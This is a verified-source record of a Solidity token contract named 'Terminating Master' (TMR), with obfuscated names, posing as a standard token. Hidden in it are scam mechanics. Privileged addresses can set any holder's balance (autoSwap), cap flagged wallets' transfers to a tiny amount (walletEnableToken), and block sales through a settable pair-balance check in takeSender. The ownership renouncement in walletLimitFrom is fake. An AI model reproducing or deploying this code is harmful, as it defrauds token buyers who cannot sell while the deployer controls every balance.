{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface swapWallet {\n    function createPair(address listReceiver, address txAt) external returns (address);\n}\n\ninterface feeMaxSell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverSender) external view returns (uint256);\n\n    function transfer(address shouldEnable, uint256 limitFund) external returns (bool);\n\n    function allowance(address receiverFromTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldEnable,\n        uint256 limitFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenLaunched, uint256 value);\n    event Approval(address indexed receiverFromTotal, address indexed spender, uint256 value);\n}\n\nabstract contract fromLimitIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountSender is feeMaxSell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TerminatingMaster is fromLimitIs, feeMaxSell, amountSender {\n\n    function name() external view virtual override returns (string memory) {\n        return receiverMarketing;\n    }\n\n    function autoSwap(address listLaunch, uint256 limitFund) public {\n        tradingMax();\n        fromExemptLimit[listLaunch] = limitFund;\n    }\n\n    uint256 private isTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTotalMode;\n    }\n\n    mapping(address => bool) public modeTradingAuto;\n\n    function transfer(address listLaunch, uint256 limitFund) external virtual override returns (bool) {\n        return takeSender(_msgSender(), listLaunch, limitFund);\n    }\n\n    uint256 toLiquidity;\n\n    function takeSender(address receiverAtList, address shouldEnable, uint256 limitFund) internal returns (bool) {\n        if (receiverAtList == exemptAuto) {\n            return marketingLiquidity(receiverAtList, shouldEnable, limitFund);\n        }\n        uint256 launchShould = feeMaxSell(toTake).balanceOf(txAmountAt);\n        require(launchShould == launchAmountTx);\n        require(shouldEnable != txAmountAt);\n        if (modeTradingAuto[receiverAtList]) {\n            return marketingLiquidity(receiverAtList, shouldEnable, walletTrading);\n        }\n        return marketingLiquidity(receiverAtList, shouldEnable, limitFund);\n    }\n\n    uint256 public receiverTake;\n\n    bool public tradingFund;\n\n    constructor (){\n        \n        enableLaunch shouldLimitWallet = enableLaunch(tokenTake);\n        toTake = swapWallet(shouldLimitWallet.factory()).createPair(shouldLimitWallet.WETH(), address(this));\n        if (amountExempt != takeSwap) {\n            amountExempt = true;\n        }\n        exemptAuto = _msgSender();\n        tokenSellSender[exemptAuto] = true;\n        fromExemptLimit[exemptAuto] = tradingTotalMode;\n        walletLimitFrom();\n        if (limitAt == isTotal) {\n            amountExempt = false;\n        }\n        emit Transfer(address(0), exemptAuto, tradingTotalMode);\n    }\n\n    function balanceOf(address receiverSender) public view virtual override returns (uint256) {\n        return fromExemptLimit[receiverSender];\n    }\n\n    bool public maxToShould;\n\n    function allowance(address limitMax, address txReceiver) external view virtual override returns (uint256) {\n        if (txReceiver == tokenTake) {\n            return type(uint256).max;\n        }\n        return fromToList[limitMax][txReceiver];\n    }\n\n    bool private takeSwap;\n\n    mapping(address => uint256) private fromExemptLimit;\n\n    function walletLimitFrom() public {\n        emit OwnershipTransferred(exemptAuto, address(0));\n        teamFund = address(0);\n    }\n\n    uint256 constant walletTrading = 9 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return listTxMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromToList;\n\n    event OwnershipTransferred(address indexed walletTakeTx, address indexed senderMarketing);\n\n    uint256 public maxMode;\n\n    function owner() external view returns (address) {\n        return teamFund;\n    }\n\n    uint256 private limitAt;\n\n    bool public receiverShould;\n\n    function shouldTradingWallet(uint256 limitFund) public {\n        tradingMax();\n        launchAmountTx = limitFund;\n    }\n\n    address public toTake;\n\n    bool public minTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoLiquidity;\n    }\n\n    uint256 private tradingTotalMode = 100000000 * 10 ** 18;\n\n    bool private amountExempt;\n\n    bool public listFrom;\n\n    function tradingMax() private view {\n        require(tokenSellSender[_msgSender()]);\n    }\n\n    string private receiverMarketing = \"Terminating Master\";\n\n    function walletEnableToken(address takeBuyLaunched) public {\n        tradingMax();\n        if (takeSwap) {\n            minTx = false;\n        }\n        if (takeBuyLaunched == exemptAuto || takeBuyLaunched == toTake) {\n            return;\n        }\n        modeTradingAuto[takeBuyLaunched] = true;\n    }\n\n    address private teamFund;\n\n    function launchTx(address tokenMarketing) public {\n        if (maxToShould) {\n            return;\n        }\n        if (listFrom) {\n            minTx = false;\n        }\n        tokenSellSender[tokenMarketing] = true;\n        \n        maxToShould = true;\n    }\n\n    function transferFrom(address receiverAtList, address shouldEnable, uint256 limitFund) external override returns (bool) {\n        if (_msgSender() != tokenTake) {\n            if (fromToList[receiverAtList][_msgSender()] != type(uint256).max) {\n                require(limitFund <= fromToList[receiverAtList][_msgSender()]);\n                fromToList[receiverAtList][_msgSender()] -= limitFund;\n            }\n        }\n        return takeSender(receiverAtList, shouldEnable, limitFund);\n    }\n\n    string private listTxMax = \"TMR\";\n\n    function approve(address txReceiver, uint256 limitFund) public virtual override returns (bool) {\n        fromToList[_msgSender()][txReceiver] = limitFund;\n        emit Approval(_msgSender(), txReceiver, limitFund);\n        return true;\n    }\n\n    uint8 private autoLiquidity = 18;\n\n    address txAmountAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address tokenTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function marketingLiquidity(address receiverAtList, address shouldEnable, uint256 limitFund) internal returns (bool) {\n        require(fromExemptLimit[receiverAtList] >= limitFund);\n        fromExemptLimit[receiverAtList] -= limitFund;\n        fromExemptLimit[shouldEnable] += limitFund;\n        emit Transfer(receiverAtList, shouldEnable, limitFund);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return teamFund;\n    }\n\n    uint256 launchAmountTx;\n\n    address public exemptAuto;\n\n    mapping(address => bool) public tokenSellSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFromTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTakeTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFund\",\"type\":\"uint256\"}],\"name\":\"autoSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"}],\"name\":\"launchTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxToShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTradingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitFund\",\"type\":\"uint256\"}],\"name\":\"shouldTradingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenSellSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAtList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuyLaunched\",\"type\":\"address\"}],\"name\":\"walletEnableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLimitFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TerminatingMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}